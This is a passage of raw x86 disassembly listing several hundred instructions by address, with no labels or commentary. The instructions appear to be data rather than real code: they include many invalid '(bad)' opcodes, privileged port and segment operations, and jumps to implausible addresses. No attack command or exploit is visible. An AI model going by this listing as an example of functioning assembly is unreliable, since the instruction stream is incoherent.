  414247:	sbb    DWORD PTR [edx+0x1b],0xf
  41424b:	hlt    
  41424c:	dec    esi
  41424d:	outs   dx,BYTE PTR ds:[esi]
  41424e:	cs inc esp
  414250:	jge    0x414298
  414252:	popa   
  414253:	(bad)  
  414254:	rcr    BYTE PTR [edi+0x62],0x62
  414258:	inc    ecx
  414259:	into   
  41425a:	enter  0xabb,0x5c
  41425e:	mov    al,ds:0x94b95106
  414263:	ficom  DWORD PTR [edx-0x741b8802]
  414269:	push   esp
  41426a:	inc    edi
  41426b:	push   ebx
  41426c:	or     dl,BYTE PTR [edx-0x4]
  41426f:	mov    ecx,DWORD PTR [eax+eiz*8+0x49f1f1a8]
  414276:	movq   QWORD PTR [eax+0x72],mm2
  41427a:	mov    bh,0x9
  41427c:	xchg   DWORD PTR [eax-0x3c5256e6],ebx
  414282:	push   edi
  414283:	xchg   edx,esi
  414285:	in     al,0x91
  414287:	fst    DWORD PTR [edi+0x54]
  41428a:	pop    ecx
  41428b:	cmp    DWORD PTR [ebp-0x5b],edi
  41428e:	jnp    0x41422f
  414290:	jecxz  0x41427e
  414292:	sar    DWORD PTR [edx+ebp*2-0x3a],0x12
  414297:	pop    ebp
  414298:	jo     0x41422b
  41429a:	and    DWORD PTR [edi+0x665cca53],ebp
  4142a0:	xchg   ebp,eax
  4142a1:	or     ah,dl
  4142a3:	inc    eax
  4142a4:	ins    DWORD PTR es:[edi],dx
  4142a5:	sub    al,0x12
  4142a7:	jg     0x4142dd
  4142a9:	cli    
  4142aa:	fstp   st(0)
  4142ac:	test   eax,0xc364a5ca
  4142b1:	push   ecx
  4142b2:	das    
  4142b3:	pop    ds
  4142b4:	std    
  4142b5:	jb     0x4142ea
  4142b7:	cs pop ebp
  4142b9:	push   esi
  4142ba:	jg     0x414241
  4142bc:	cld    
  4142bd:	ror    DWORD PTR [edi],cl
  4142bf:	xlat   BYTE PTR ds:[ebx]
  4142c0:	push   ebp
  4142c1:	push   0x5a5384c7
  4142c6:	adc    ch,al
  4142c8:	(bad)  
  4142c9:	int    0xb6
  4142cb:	sub    al,0xd8
  4142cd:	pop    esi
  4142ce:	cs fscale 
  4142d1:	je     0x4142ba
  4142d3:	(bad)  
  4142d4:	test   BYTE PTR [esi+0x7f4d36b7],0xd2
  4142db:	out    0xf8,eax
  4142dd:	xor    esp,DWORD PTR [edx+0x4753ab53]
  4142e3:	aas    
  4142e4:	loopne 0x41428b
  4142e6:	cmp    bh,bl
  4142e8:	cmp    BYTE PTR [ebx],al
  4142ea:	in     al,dx
  4142eb:	out    dx,al
  4142ec:	ret    
  4142ed:	jns    0x41433c
  4142ef:	test   DWORD PTR [ecx+0x73],0x24db6bb8
  4142f6:	repz bound ecx,QWORD PTR [edi+ebx*2+0x76]
  4142fb:	adc    bh,BYTE PTR [ebp-0x3fe801]
  414301:	cmp    edi,edx
  414303:	int    0xc7
  414305:	imul   eax,DWORD PTR [esi-0x6851fd1a],0x522132c4
  41430f:	leave  
  414310:	sbb    al,0x55
  414312:	imul   esp,DWORD PTR ds:0xbd193ed2,0xe2af3d9a
  41431c:	adc    BYTE PTR ds:0x92a2775c,0xdb
  414323:	mov    ch,0xc8
  414325:	fst    QWORD PTR [eax+esi*8]
  414328:	mov    al,ds:0xdbeeb415
  41432d:	aad    0xc
  41432f:	mov    bh,0xf5
  414331:	jnp    0x41431a
  414333:	sahf   
  414334:	mov    DWORD PTR [edi-0x61],esp
  414337:	sub    al,0x71
  414339:	and    ecx,eax
  41433b:	and    eax,0xd50f26ec
  414340:	mul    dh
  414342:	pushf  
  414343:	jbe    0x41439f
  414345:	pop    edx
  414346:	stos   BYTE PTR es:[edi],al
  414347:	pop    edi
  414348:	adc    BYTE PTR [ebx],dh
  41434a:	(bad)  
  41434b:	push   0xffffffe1
  41434d:	or     al,0x23
  41434f:	dec    edi
  414350:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414351:	in     al,dx
  414352:	rcl    esp,cl
  414354:	add    eax,0x16340402
  414359:	or     al,bl
  41435b:	cwde   
  41435c:	(bad)  [eax]
  41435e:	mov    edx,0x8f75b0fa
  414363:	into   
  414364:	push   eax
  414365:	(bad)  [edx+0x29]
  414368:	std    
  414369:	mov    eax,0x3b5c2ac3
  41436e:	lods   al,BYTE PTR ds:[esi]
  41436f:	push   ecx
  414370:	mov    eax,ds:0x8326aa25
  414375:	stos   DWORD PTR es:[edi],eax
  414376:	test   al,0xf2
  414378:	jo     0x41435f
  41437a:	dec    eax
  41437b:	jmp    0x9fdf:0xf1363328
  414382:	ins    DWORD PTR es:[edi],dx
  414383:	xchg   edi,eax
  414384:	xchg   ebx,eax
  414385:	repnz sub BYTE PTR [ebx+0x2d],ah
  414389:	push   0x59
  41438b:	and    esp,ebx
  41438d:	mov    si,0xa79e
  414391:	lock icebp 
  414393:	cmp    eax,0xf504da9d
  414398:	mov    edi,DWORD PTR [ebx+0x7c67f26e]
  41439e:	cmp    edx,DWORD PTR [esi+0x65]
  4143a1:	mov    es,WORD PTR [esp]
  4143a4:	xchg   esp,eax
  4143a5:	scas   al,BYTE PTR es:[edi]
  4143a6:	cld    
  4143a7:	sbb    BYTE PTR [ecx+esi*1],dl
  4143aa:	repz push 0xdbec2f42
  4143b0:	mov    edx,DWORD PTR [eax-0x2]
  4143b3:	cwde   
  4143b4:	add    DWORD PTR [edx+ecx*8],ebx
  4143b7:	addr16 xchg ecx,eax
  4143b9:	out    0xaa,eax
  4143bb:	pusha  
  4143bc:	xor    DWORD PTR [edx+0x2440a8b8],0xe
  4143c3:	pop    es
  4143c4:	nop
  4143c5:	rcr    BYTE PTR [edx+0x5],cl
  4143c8:	je     0x4143de
  4143ca:	and    eax,0xa8dab5e3
  4143cf:	std    
  4143d0:	(bad)  
  4143d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4143d2:	(bad)  
  4143d3:	fbstp  TBYTE PTR [edx-0x3adb038]
  4143d9:	fisttp QWORD PTR [eax+0x29323daa]
  4143df:	push   ecx
  4143e0:	test   al,0x4
  4143e2:	jmp    0x4143ea
  4143e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4143e5:	cmp    ch,BYTE PTR [ebx]
  4143e7:	leave  
  4143e8:	outs   dx,DWORD PTR ds:[esi]
  4143e9:	ins    BYTE PTR es:[edi],dx
  4143ea:	xchg   ebp,eax
  4143eb:	test   al,0xe1
  4143ed:	imul   esp,DWORD PTR [esi],0xffffff9b
  4143f0:	or     eax,eax
  4143f2:	jns    0x414415
  4143f4:	jmp    0x4654:0x8418a841
  4143fb:	dec    esi
  4143fc:	jl     0x4143b2
  4143fe:	popf   
  4143ff:	dec    ecx
  414400:	jns    0x414412
  414402:	call   0x104bcb65
  414407:	stos   DWORD PTR es:[edi],eax
  414408:	or     DWORD PTR [edi+0x0],ebx
  41440b:	mov    dh,0x3a
  41440e:	xor    eax,0x5876d731
  414413:	add    eax,0x46e9e225
  414418:	mov    al,0x22
  41441a:	pop    edx
  41441b:	push   edi
  41441c:	jns    0x41447b
  41441e:	gs (bad) 
  414420:	loope  0x414457
  414422:	cld    
  414423:	mov    BYTE PTR [edx+edi*4],cl
  414426:	shl    BYTE PTR [ebx+0x28],0x60
  41442a:	cld    
  41442b:	arpl   di,bp
  41442d:	addr16 ret 
  41442f:	xor    BYTE PTR [esi],bh
  414431:	jne    0x4143fa
  414433:	pop    ds
  414434:	sub    al,0xf
  414436:	xor    al,0x88
  414438:	outs   dx,DWORD PTR ds:[esi]
  414439:	in     eax,0xbe
  41443b:	jmp    0x2fb71b93
  414440:	jns    0x414444
  414442:	jg     0x414461
  414444:	scas   eax,DWORD PTR es:[edi]
  414445:	xchg   edx,eax
  414446:	call   0xc04d:0x6b8a9f1d
  41444d:	dec    ecx
  41444e:	pop    es
  41444f:	mov    ecx,ebx
  414451:	enter  0x1c85,0x9b
  414455:	ins    BYTE PTR es:[edi],dx
  414456:	or     ebx,DWORD PTR [ebx+0x156c8a76]
  41445c:	push   edi
  41445d:	jmp    0x4143ff
  41445f:	dec    ecx
  414460:	xor    al,0x61
  414462:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414463:	in     al,dx
  414464:	lock mov ebx,0xfec6e26b
  41446a:	jp     0x4144b0
  41446c:	fstp   TBYTE PTR [ecx]
  41446e:	fisubr WORD PTR [ecx+0x2e770ce5]
  414474:	sbb    DWORD PTR [edi-0xc92c1b2],edx
  41447a:	sub    al,0x2c
  41447c:	dec    edi
  41447d:	int    0xe5
  41447f:	outs   dx,DWORD PTR ds:[esi]
  414480:	jnp    0x41443e
  414482:	cmp    ebp,0xffffffa2
  414485:	push   esp
  414486:	push   esi
  414487:	test   eax,0xe056dbd4
  41448c:	xcrypt-ofb (bad)
  41448d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41448e:	cs xchg ecx,eax
  414490:	jae    0x4144d3
  414492:	lock les edx,FWORD PTR [ebp+0x74]
  414496:	into   
  414497:	mov    dh,0x9f
  414499:	xchg   esi,ecx
  41449b:	sahf   
  41449c:	mov    dl,0x3e
  41449e:	push   ecx
  41449f:	add    ch,BYTE PTR [ecx+0x7a77b724]
  4144a5:	mov    ebp,0x767593e5
  4144aa:	dec    edx
  4144ab:	pop    ebx
  4144ac:	mov    dh,0x44
  4144ae:	(bad)  
  4144af:	jge    0x4144af
  4144b1:	out    0x8a,al
  4144b3:	pop    ss
  4144b4:	and    al,0x9d
  4144b6:	(bad)  
  4144b7:	jo     0x4144d0
  4144b9:	lea    eax,ds:0xae0dd3fa
  4144bf:	scas   eax,DWORD PTR es:[edi]
  4144c0:	sub    al,0x80
  4144c2:	and    bl,BYTE PTR [ebx+0xcef9cab]
  4144c8:	ror    dl,cl
  4144ca:	mov    ds,WORD PTR [edx-0x14eb3a90]
  4144d0:	xor    al,BYTE PTR [ebp-0x69]
  4144d3:	mov    esi,0x41840c45
  4144d8:	add    DWORD PTR [edi-0x209d1e7],esp
  4144de:	ret    0xebc0
  4144e1:	je     0x414515
  4144e3:	fcomp  QWORD PTR [ebx]
  4144e5:	dec    ebx
  4144e6:	mov    ebx,DWORD PTR [esi]
  4144e8:	add    ebp,DWORD PTR [ebp+0xc07822d]
  4144ee:	movq   QWORD PTR [esi+0x72],mm5
  4144f2:	mov    ?,WORD PTR [eax]
  4144f4:	mov    ecx,0xd4e0f1b2
  4144f9:	mov    bl,0xe0
  4144fb:	sub    bl,bh
  4144fd:	fild   QWORD PTR [edi+0x1df23074]
  414503:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414504:	mov    WORD PTR ds:0x9f133a05,ds
  41450a:	in     al,0x8e
  41450c:	aaa    
  41450d:	xor    BYTE PTR [edi],bl
  41450f:	shr    BYTE PTR [ecx+0x29],0xa6
  414513:	out    0x28,eax
  414515:	adc    eax,0x9c256f46
  41451a:	pop    eax
  41451b:	add    eax,0xff384e7d
  414520:	jp     0x4144d3
  414522:	popa   
  414523:	stos   DWORD PTR es:[edi],eax
  414524:	adc    al,0x9
  414526:	mov    ds:0x345aded6,al
  41452b:	mov    eax,ds:0x280158de
  414530:	loope  0x414578
  414532:	imul   edx,DWORD PTR [eax+0x4f],0xffffff98
  414536:	cli    
  414537:	outs   dx,BYTE PTR ds:[esi]
  414538:	jnp    0x4144e8
  41453a:	ss (bad) 
  41453c:	ror    DWORD PTR [eax+edi*1+0x4c],1
  414540:	add    ebp,DWORD PTR [edi]
  414542:	adc    al,ch
  414544:	test   BYTE PTR [ebp+0x35],ah
  414547:	sub    al,0x6d
  414549:	pop    esp
  41454a:	mov    ch,0xc8
  41454c:	sub    BYTE PTR [esi],0xcf
  41454f:	add    dh,dh
  414551:	ficom  WORD PTR ds:0xa6ed71e9
  414557:	mov    dl,0x98
  414559:	jnp    0x414588
  41455b:	inc    edx
  41455c:	cwde   
  41455d:	in     al,0x5e
  41455f:	cdq    
  414560:	mov    ds:0xf4101588,eax
  414565:	(bad)  
  414566:	(bad)  
  414567:	adc    cl,BYTE PTR ds:0x8ff3514f
  41456d:	fs pop esi
  41456f:	iret   
  414570:	cs jbe 0x41450d
  414573:	lods   eax,DWORD PTR ds:[esi]
  414574:	in     al,0x23
  414576:	daa    
  414577:	mov    ch,0xde
  414579:	(bad)
  41457c:	mov    ecx,0x2d2d4cd6
  414581:	push   es
  414582:	mov    tr0,ebx
  414585:	push   0xe3d03beb
  41458a:	xchg   edx,eax
  41458b:	sub    BYTE PTR [ebp+0x6a777bfd],cl
  414591:	ds int3 
  414593:	fisttp WORD PTR [eax+0x58]
  414596:	fnstenv [ecx]
  414598:	(bad)  
  414599:	cmp    edx,DWORD PTR [eax+0x7a]
  41459c:	(bad)  
  41459d:	faddp  st(0),st
  41459f:	not    BYTE PTR [edx+0x388a8108]
  4145a5:	in     eax,dx
  4145a6:	mov    al,ds:0x4564de40
  4145ab:	fild   QWORD PTR [eiz*8+0x27227e70]
  4145b2:	pop    esp
  4145b3:	aam    0xc2
  4145b5:	nop
  4145b6:	cmp    edx,0x12dc814b
  4145bc:	mov    eax,0x261cfb1f
  4145c1:	mov    ah,0x25
  4145c3:	pusha  
  4145c4:	cmp    BYTE PTR [esi+0x62],cl
  4145c7:	sbb    BYTE PTR [eax+0x44],0x70
  4145cb:	lds    ebp,FWORD PTR [ebx+0x61dd08d3]
  4145d1:	mov    cs,WORD PTR [ecx]
  4145d3:	jmp    0x414611
  4145d5:	jmp    0x7cc1a478
  4145da:	fs lock xchg esp,eax
  4145dd:	xor    al,0x2e
  4145e0:	dec    edx
  4145e1:	in     eax,0xf5
  4145e3:	inc    ecx
  4145e4:	aam    0x7
  4145e6:	and    BYTE PTR [ebx+esi*1-0x7],al
  4145ea:	stos   DWORD PTR es:[edi],eax
  4145eb:	in     al,0x8b
  4145ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145ee:	mov    ebp,DWORD PTR [ecx-0xdbdebdf]
  4145f4:	and    DWORD PTR [eax-0x6c626ec8],esp
  4145fa:	(bad)  
  4145fb:	sbb    ecx,DWORD PTR [edx+esi*2-0x5572d351]
  414602:	push   es
  414603:	outs   dx,DWORD PTR ds:[esi]
  414604:	fdivr  st,st(5)
  414606:	jmp    0x4145e2
  414608:	fcomp  QWORD PTR [eax-0x215f7da2]
  41460e:	sbb    eax,0xe498b14f
  414613:	jge    0x414664
  414615:	adc    eax,0x6d31c93
  41461a:	cmp    dl,0xf8
  41461d:	pop    ebp
  41461e:	cdq    
  41461f:	dec    eax
  414620:	je     0x414642
  414622:	std    
  414623:	cmc    
  414624:	stos   DWORD PTR es:[edi],eax
  414625:	adc    BYTE PTR [eax-0x5c0636a4],ah
  41462b:	cli    
  41462c:	ror    DWORD PTR [ebx+0x77],cl
  41462f:	dec    esp
  414630:	lods   al,BYTE PTR ds:[esi]
  414631:	les    edx,FWORD PTR [eax]
  414633:	pop    ecx
  414634:	out    dx,eax
  414635:	aaa    
  414636:	pushf  
  414637:	stc    
  414638:	sub    eax,0xcc3baced
  41463d:	mov    edi,DWORD PTR [eax+ebp*8-0x562ac56e]
  414644:	ss push esi
  414646:	jg     0x4146c1
  414648:	std    
  414649:	(bad)  
  41464a:	mov    ah,0x76
  41464c:	or     ebp,DWORD PTR [ebx-0x62e5e1d6]
  414652:	fnstenv [esi+0x3d]
  414655:	jb     0x4146d5
  414657:	ror    ebp,cl
  414659:	inc    ecx
  41465a:	jae    0x41469f
  41465c:	push   edx
  41465d:	stos   DWORD PTR es:[edi],eax
  41465e:	xchg   edx,eax
  41465f:	test   eax,0x580a9835
  414664:	mov    edi,0xe967af61
  414669:	cmp    DWORD PTR [ebp+0x48],esp
  41466c:	adc    ecx,DWORD PTR [esi+0x5af4b831]
  414672:	fs add eax,0xab88fafb
  414678:	jnp    0x41463f
  41467a:	pop    ds
  41467b:	out    0x25,al
  41467d:	xchg   ebp,eax
  41467e:	jmp    0x1bb1cc32
  414683:	mov    bl,0x4d
  414685:	push   eax
  414686:	fist   DWORD PTR [ecx]
  414688:	outs   dx,BYTE PTR ds:[esi]
  414689:	and    BYTE PTR [ebx+eax*4],0x6d
  41468d:	pop    ss
  41468e:	jl     0x41462a
  414690:	mov    ebp,0xd35b833d
  414695:	aaa    
  414696:	and    BYTE PTR [esp+edx*1-0x775dea40],dh
  41469d:	lahf   
  41469e:	mov    esi,0xd0168a3a
  4146a3:	mov    ds:0xda8a2e9d,eax
  4146a8:	fxam   
  4146aa:	dec    esp
  4146ab:	sbb    BYTE PTR [eax],cl
  4146ad:	lds    esi,FWORD PTR [eax]
  4146af:	cld    
  4146b0:	push   edx
  4146b1:	ins    BYTE PTR es:[edi],dx
  4146b2:	dec    eax
  4146b3:	mov    ah,0xd9
  4146b5:	(bad)  [esi+0x7525aadf]
  4146bb:	dec    ebp
  4146bc:	shl    BYTE PTR [edx+0x43],0x7e
  4146c0:	outs   dx,BYTE PTR ds:[esi]
  4146c1:	mov    ebp,0x5026ab02
  4146c6:	push   0x65
  4146c8:	pop    ds
  4146c9:	scas   eax,DWORD PTR es:[edi]
  4146ca:	and    al,0x1f
  4146cc:	popa   
  4146cd:	pop    esp
  4146ce:	inc    ebp
  4146cf:	jge    0x4146fb
  4146d1:	ins    DWORD PTR es:[edi],dx
  4146d2:	lahf   
  4146d3:	retf   
  4146d4:	aas    
  4146d5:	enter  0x8d9f,0xc7
  4146d9:	cld    
  4146da:	sahf   
  4146db:	push   ecx
  4146dc:	add    eax,0xa346ad87
  4146e1:	test   bl,dl
  4146e3:	sbb    al,0xbf
  4146e5:	jne    0x4146f8
  4146e7:	mov    esi,0x6759a756
  4146ec:	out    0xbc,al
  4146ee:	lds    ebx,FWORD PTR fs:[si-0x20e4]
  4146f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4146f5:	mov    esp,edx
  4146f7:	daa    
  4146f8:	outs   dx,DWORD PTR ds:[esi]
  4146f9:	add    BYTE PTR [ebx+edi*8],dh
  4146fc:	ss push ebp
  4146fe:	adc    ecx,DWORD PTR [eax-0x51bc8ba4]
  414704:	loop   0x4146a1
  414706:	int    0x77
  414708:	or     ah,BYTE PTR [ecx+ebx*2+0x27]
  41470c:	loopne 0x414739
  41470e:	ins    BYTE PTR es:[edi],dx
  41470f:	dec    esp
  414710:	mov    ah,BYTE PTR [ebp-0x22]
  414713:	jge    0x4146d9
  414715:	stos   BYTE PTR es:[edi],al
  414716:	push   ds
  414717:	xor    eax,0x189f2075
  41471c:	sub    eax,0x481821f1
  414721:	xchg   edi,eax
  414722:	sub    ah,BYTE PTR [ebx+edi*1+0x15]
  414726:	and    ecx,DWORD PTR [edi-0x7bc3c259]
  41472c:	xor    DWORD PTR [eax],esi
  41472e:	push   ds
  41472f:	xchg   BYTE PTR [ecx],ch
  414731:	sub    al,0x82
  414733:	sti    
  414734:	push   0xffffff96
  414736:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414737:	jmp    0x1a32:0xb77a3047
  41473e:	jge    0x41479b
  414740:	mov    eax,ds:0xa7991f72
  414745:	sbb    esp,DWORD PTR ds:[edi-0x179e9cae]
  41474c:	sub    BYTE PTR [ecx],cl
  41474e:	lahf   
  41474f:	cmp    DWORD PTR [esp+ebp*4-0x78],ebx
  414753:	sbb    al,0x45
  414755:	pop    ecx
  414756:	sbb    DWORD PTR [eax],0x59525090
  41475c:	mov    esp,0xd722a590
  414761:	fs pop edi
  414763:	xchg   ebp,eax
  414764:	(bad)  
  414765:	xor    ecx,DWORD PTR [eax-0x280791f1]
  41476b:	enter  0x7cb,0x80
  41476f:	xchg   ecx,eax
  414770:	push   0x7198bcfc
  414775:	loopne 0x4147e2
  414777:	dec    esp
  414778:	add    DWORD PTR ds:0xf14b0654,0x36264a19
  414782:	add    al,0x44
  414784:	mov    al,0x40
  414786:	sub    BYTE PTR [ecx+ebp*8],bl
  414789:	fwait
  41478a:	aas    
  41478b:	cwde   
  41478c:	arpl   WORD PTR [edx+0xb905bb1],dx
  414792:	xor    BYTE PTR gs:[edx+0x77],cl
  414796:	icebp  
  414797:	enter  0x31ea,0x44
  41479b:	pop    edx
  41479c:	pop    es
  41479d:	dec    edi
  41479e:	aam    0xca
  4147a0:	jle    0x4147c3
  4147a2:	push   ebx
  4147a3:	push   edi
  4147a4:	jbe    0x4147c8
  4147a6:	js     0x41475e
  4147a8:	imul   eax,ebp,0xfffffff6
  4147ab:	pop    edi
  4147ac:	and    DWORD PTR [ecx+0x11cf35f9],0xffffffdf
  4147b3:	or     edi,DWORD PTR [ebx]
  4147b5:	sub    eax,esi
  4147b7:	pavgb  mm1,QWORD PTR [ebx-0x4d833295]
  4147be:	inc    eax
  4147bf:	fcomp  QWORD PTR [edi+eiz*2-0x74903f84]
  4147c6:	mov    DWORD PTR ds:0x76994f8c,ecx
  4147cc:	test   eax,0xb6105841
  4147d1:	sahf   
  4147d2:	add    eax,0xb012da6
  4147d7:	pop    edi
  4147d8:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  4147da:	xchg   DWORD PTR [ecx-0x3e],esi
  4147dd:	jg     0x414845
  4147df:	cmp    al,0xba
  4147e1:	dec    esi
  4147e2:	and    eax,0x17645d09
  4147e7:	dec    ecx
  4147e8:	inc    ecx
  4147e9:	pushf  
  4147ea:	mov    ds:0x245a6fdb,al
  4147ef:	inc    edx
  4147f0:	pop    esp
  4147f1:	adc    DWORD PTR [ecx+ebp*4-0x2e],ebx
  4147f5:	rcl    DWORD PTR [esi-0x48],0x65
  4147f9:	loopne 0x414867
  4147fb:	pop    ebp
  4147fc:	pop    es
  4147fd:	clc    
  4147fe:	push   ebp
  4147ff:	inc    eax
  414800:	add    al,0xc6
  414802:	sub    al,0x83
  414804:	inc    esp
  414805:	inc    eax
  414806:	push   ss
  414807:	ins    BYTE PTR es:[edi],dx
  414808:	(bad)  
  414809:	aad    0x1a
  41480b:	pop    ebp
  41480c:	adc    BYTE PTR [ecx],cl
  41480e:	fnstcw WORD PTR [esi-0x494d8139]
  414814:	enter  0x346c,0x96
  414818:	mov    esp,0xdb8114b8
  41481d:	xor    esp,0xffffffb4
  414820:	mov    ds,edi
  414822:	push   ebx
  414823:	repz xchg esi,eax
  414825:	pop    edx
  414826:	adc    al,0x2d
  414828:	rcr    BYTE PTR [ecx-0x6a8abcfe],cl
  41482e:	in     al,0xcc
  414830:	je     0x41480b
  414832:	push   esi
  414833:	sbb    dh,al
  414835:	test   edi,ebp
  414837:	and    DWORD PTR [esi],ebp
  414839:	(bad)  
  41483a:	mov    edx,0x77f7d0af
  41483f:	jmp    0xe3b4864c
  414844:	out    0xa9,eax
  414846:	into   
  414847:	jnp    0x41484e
  414849:	ds jge 0x41484b
  41484c:	jle    0x4148ba
  41484e:	(bad)  
  41484f:	push   ds
  414850:	in     eax,0x2c
  414852:	iret   
  414853:	xchg   ebp,eax
  414854:	mov    dh,0x30
  414856:	sub    eax,0x1db5fa5
  41485b:	xchg   esp,eax
  41485c:	in     eax,0x14
  41485e:	jne    0x414819
  414860:	in     eax,0x96
  414862:	xchg   ebp,eax
  414863:	jbe    0x41484b
  414865:	adc    esi,DWORD PTR [eax]
  414867:	pop    ss
  414868:	js     0x4148b5
  41486a:	mov    eax,esi
  41486c:	mov    bh,0x5d
  41486e:	mov    eax,ebx
  414870:	das    
  414871:	cli    
  414872:	add    eax,0xaff716ea
  414877:	mul    cl
  414879:	pusha  
  41487a:	loope  0x414832
  41487c:	fmul   QWORD PTR [eax]
  41487e:	push   cs
  41487f:	xchg   dl,cl
  414881:	and    eax,0xbf1fa5a4
  414886:	out    0x1d,al
  414888:	push   edi
  414889:	sub    ecx,esi
  41488b:	call   0xe78bbeed
  414890:	add    esp,DWORD PTR [ebx]
  414892:	inc    ebx
  414893:	test   DWORD PTR [esi-0x24691882],ebp
  414899:	sbb    al,0x25
  41489b:	test   al,0x67
  41489d:	ret    
  41489e:	mov    ecx,0xf04863c0
  4148a3:	add    eax,0x88daff69
  4148a8:	dec    esi
  4148a9:	test   al,0xfc
  4148ab:	xor    BYTE PTR [edx-0x1939a29c],dl
  4148b1:	(bad)  [edx]
  4148b3:	jnp    0x414861
  4148b5:	pop    ebx
  4148b6:	stos   BYTE PTR es:[edi],al
  4148b7:	adc    ecx,DWORD PTR [eax+0x3cb2448c]
  4148bd:	dec    eax
  4148be:	or     cl,BYTE PTR [edi-0x5bbeee1c]
  4148c4:	dec    edx
  4148c5:	fcomp  DWORD PTR [ebx+0x1da6bf67]
  4148cb:	(bad)  [eax]
  4148cd:	mov    edx,0x5c9b9151
  4148d2:	sbb    DWORD PTR [eax],0x6dc0401e
  4148d8:	sub    eax,0xc232dd
  4148dd:	dec    esp
  4148de:	xchg   edi,eax
  4148df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4148e0:	inc    esi
  4148e1:	outs   dx,BYTE PTR ds:[esi]
  4148e2:	retf   0x9587
  4148e5:	sbb    DWORD PTR [edx],ebp
  4148e7:	outs   dx,DWORD PTR ds:[esi]
  4148e8:	call   0x337d:0x58d16309
  4148ef:	jo     0x414965
  4148f1:	fimul  DWORD PTR [edi-0x58]
  4148f4:	or     al,0xbf
  4148f6:	and    bl,BYTE PTR [ecx-0x45]
  4148f9:	nop
  4148fa:	adc    ecx,DWORD PTR [ecx+0x67e8b757]
  414900:	xchg   esp,eax
  414901:	mov    eax,ds:0x68bd5d0b
  414906:	lahf   
  414907:	mov    dh,0x5e
  414909:	push   ecx
  41490a:	lods   eax,DWORD PTR ds:[esi]
  41490b:	xchg   ecx,eax
  41490c:	test   al,0xaf
  41490e:	push   edi
  41490f:	add    DWORD PTR es:[esp+edi*4],0x41311c17
  414917:	outs   dx,BYTE PTR ds:[esi]
  414918:	xchg   ebp,eax
  414919:	ds jge 0x414918
  41491c:	mov    al,BYTE PTR [ecx+ebp*2]
  41491f:	stos   BYTE PTR es:[edi],al
  414920:	mov    ebx,0x231240e2
  414925:	fistp  WORD PTR [eax+0x7f]
  414928:	fsubr  QWORD PTR [ebx-0x66]
  41492b:	xchg   BYTE PTR ds:0x2cd1be83,bh
  414931:	mov    ebx,0x79a1ad84
  414936:	pop    ds
  414937:	add    bh,BYTE PTR [esi-0x3d824254]
  41493d:	inc    ebp
  41493e:	sub    DWORD PTR [edx-0x614ed69],ecx
  414944:	popa   
  414945:	pop    edx
  414946:	inc    ebp
  414947:	xchg   esi,eax
  414948:	push   es
  414949:	mov    ?,ebx
  41494b:	sub    BYTE PTR es:[edi+ecx*2+0x4d5d7012],bh
  414953:	fidiv  DWORD PTR [ebp+0x1d9a797d]
  414959:	pop    esi
  41495a:	mov    edx,0xfd6ad0bc
  41495f:	(bad)  
  414960:	lods   al,BYTE PTR ds:[esi]
  414961:	sbb    ah,dh
  414963:	jnp    0x41490e
  414965:	outs   dx,DWORD PTR ds:[esi]
  414966:	pop    ds
  414967:	test   DWORD PTR [eax+0x40],0x8bb437cd
  41496e:	pop    edi
  41496f:	jbe    0x7e2de0bf
  414975:	pop    ebp
  414976:	mov    ebx,0x80192d2b
  41497b:	pop    eax
  41497c:	gs jle 0x4149d7
  41497f:	(bad)  
  414980:	cmp    BYTE PTR [ecx],ch
  414982:	ins    BYTE PTR es:[edi],dx
  414983:	dec    esp
  414984:	cli    
  414985:	loopne 0x414984
  414987:	pop    esi
  414988:	inc    eax
  414989:	or     BYTE PTR [esi+0x5e],al
  41498c:	cli    
  41498d:	adc    DWORD PTR [ecx],ebp
  41498f:	add    edx,DWORD PTR [ebx]
  414991:	rcl    ah,cl
  414993:	shl    ecx,0xd9
  414996:	rol    DWORD PTR [edx],cl
  414998:	imul   esp,eax,0xffffff97
  41499b:	dec    ebx
  41499c:	out    dx,eax
  41499d:	test   BYTE PTR [eax+eax*2+0x7a],ah
  4149a1:	outs   dx,DWORD PTR ds:[esi]
  4149a2:	and    esi,DWORD PTR [bp+di+0x66]
  4149a6:	mov    dl,0xc8
  4149a8:	inc    esp
  4149a9:	pushf  
  4149aa:	stos   DWORD PTR es:[edi],eax
  4149ab:	or     DWORD PTR [ecx],ebx
  4149ad:	retf   0xd328
  4149b0:	dec    ebp
  4149b1:	pop    ebp
  4149b2:	(bad)  
  4149b3:	dec    ebx
  4149b4:	aam    0x13
  4149b6:	jmp    0xe1fd:0x8a2bb55e
  4149bd:	imul   eax,DWORD PTR ds:0x8590c25c,0x256d4b47
  4149c7:	mov    ecx,0x692a1ae1
  4149cc:	popa   
  4149cd:	mov    ecx,0x39dfed37
  4149d2:	imul   ecx,DWORD PTR [edx+0x26],0xab1fe2d
  4149d9:	jp     0x414a04
  4149db:	(bad)  
  4149dc:	sbb    DWORD PTR ds:0x4cbb7019,esp
  4149e2:	retf   
  4149e3:	push   eax
  4149e4:	sahf   
  4149e5:	push   ss
  4149e6:	mov    BYTE PTR [ebp-0x1f],ah
  4149e9:	iret   
  4149ea:	addr16 repz repz das 
  4149ee:	pop    ecx
  4149ef:	cli    
  4149f0:	sub    BYTE PTR [edi+edi*4-0x15],bl
  4149f4:	or     DWORD PTR [esi-0x64],eax
  4149f7:	sbb    eax,0xbedb91f8
  4149fc:	pop    edx
  4149fd:	add    al,0x28
  4149ff:	stos   BYTE PTR es:[edi],al
  414a00:	pop    edi
  414a01:	in     al,dx
  414a02:	retf   
  414a03:	mov    dh,0x75
  414a05:	rcl    al,1
  414a07:	les    esi,FWORD PTR [ecx+0x74]
  414a0a:	xor    sp,ax
  414a0d:	mov    ah,0xde
  414a0f:	dec    ebx
  414a10:	jg     0x414a66
  414a12:	fistp  DWORD PTR [esi]
  414a14:	aas    
  414a15:	adc    BYTE PTR [edi-0x40],ch
  414a18:	out    0x77,al
  414a1a:	inc    ebx
  414a1b:	int3   
  414a1c:	pop    ecx
